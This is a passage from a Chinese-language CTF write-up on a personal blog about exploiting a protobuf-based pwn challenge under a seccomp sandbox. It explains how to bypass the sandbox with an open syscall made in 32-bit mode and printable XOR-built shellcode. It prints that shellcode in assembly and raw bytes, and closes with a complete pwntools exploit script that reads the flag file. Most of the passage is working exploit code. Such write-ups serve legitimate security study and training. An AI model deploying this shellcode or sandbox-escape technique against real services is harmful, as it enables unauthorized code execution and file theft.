+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0003</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>这里限制了只能使用<code>read write fstat alarm exit_group</code>，程序是<code>64</code>位的，而<code>fstat</code>在<code>32</code>位中对应的函数就是<code>open</code>，所以可以使用<code>32</code>位的<code>open</code>和<code>64</code>位的<code>read write</code></p>
+<h3 id="构造syscall"><a href="#构造syscall" class="headerlink" title="构造syscall"></a>构造syscall</h3><p>限制了可见字符且限制长度的情况下第一步就需要先构造一个<code>read</code>无限制的再读一次，而<code>syscall</code>的汇编字节是<code>0x0f05</code>不在可见字符范围内，所以需要通过异或构造，需要注意端序问题，小端序要反过来写进去，即<code>0x050f</code>，写在<code>shellcode</code>末尾用来异或的数值也要反过来写，我选择的是<code>0x66666963 ^ 0x66666c6c = 0x50f</code>，构造<code>shellcode</code>如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push 0x66666963</span><br><span class="line">pop rsi</span><br><span class="line">xor qword ptr [rax + 0x20], rsi</span><br><span class="line">push rbx</span><br><span class="line">pop rdi</span><br><span class="line">xor al, 0x22</span><br><span class="line">push rax</span><br><span class="line">pop rsi</span><br><span class="line">push 0x66666963</span><br><span class="line">pop rdx</span><br><span class="line">push rbx</span><br><span class="line">pop rax</span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">\x6c\x6c\x66\x66</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构切换调用open"><a href="#架构切换调用open" class="headerlink" title="架构切换调用open"></a>架构切换调用open</h3><p>使用汇编指令<code>retfq</code>切换架构，原理是改<code>cs</code>寄存器，当<code>cs</code>寄存器的值为<code>0x33</code>时识别为<code>64</code>位，当寄存器值位<code>0x23</code>时识别位<code>32</code>位，而<code>retfq</code>指令相当于<code>pop ip; pop cs</code>，所以需要先<code>push cs</code>再<code>push</code>需要执行的指令地址最后<code>retfq</code>切换架构</p>
+<p>不过其实我没切换直接写<code>32</code>位的<code>shellcode</code>用<code>int 80</code>实现系统调用也能执行<code>open</code>…<code>shellcode</code>如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov  eax, 5</span><br><span class="line">push ecx</span><br><span class="line">pop  ebx</span><br><span class="line">mov  dword ptr [ecx], 0x6c662f2e</span><br><span class="line">add  ecx, 4</span><br><span class="line">mov  dword ptr [ecx], 0x6761</span><br><span class="line">xor ecx, ecx</span><br><span class="line">xor edx, edx</span><br><span class="line">int  0x80</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> bot_pb2 <span class="keyword">import</span> Msgbot</span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">21231</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x66666963</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">xor qword ptr [rax + 0x20], rsi</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor al, 0x22</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x66666963</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">\x6c\x6c\x66\x66</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">msgcontent = <span class="string">b&#x27;\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58&#x27;</span> + <span class="string">b&#x27;\x50&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x6c\x6c\x66\x66&#x27;</span></span><br><span class="line"></span><br><span class="line">msg = Msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = msgcontent</span><br><span class="line">serialized = msg.SerializeToString()</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;botmsg&#x27;</span>, serialized)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov  eax, 5</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">pop  ebx</span></span><br><span class="line"><span class="string">mov  dword ptr [ecx], 0x6c662f2e</span></span><br><span class="line"><span class="string">add  ecx, 4</span></span><br><span class="line"><span class="string">mov  dword ptr [ecx], 0x6761</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">int  0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80&quot;</span></span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">r.send(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>viol1t</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://viol1t.com/2024/10/13/protobuf-pwn%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://viol1t.com/2024/10/13/protobuf-pwn%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/protobuf/"># protobuf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/10/21/2024%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9Bwp/">2024年强网拟态初赛wp</a>
+            
+            
+            <a class="next" rel="next" href="/2024/09/23/%E6%B5%85%E6%9E%90riscv%E9%80%86%E5%90%91-%E7%94%B12024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%80%E9%81%93%E9%9B%B6%E8%A7%A3%E9%A2%98plctlove%E5%BC%80%E5%A7%8B/">浅析riscv逆向-由2024工业互联网一道零解题plctlove开始</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
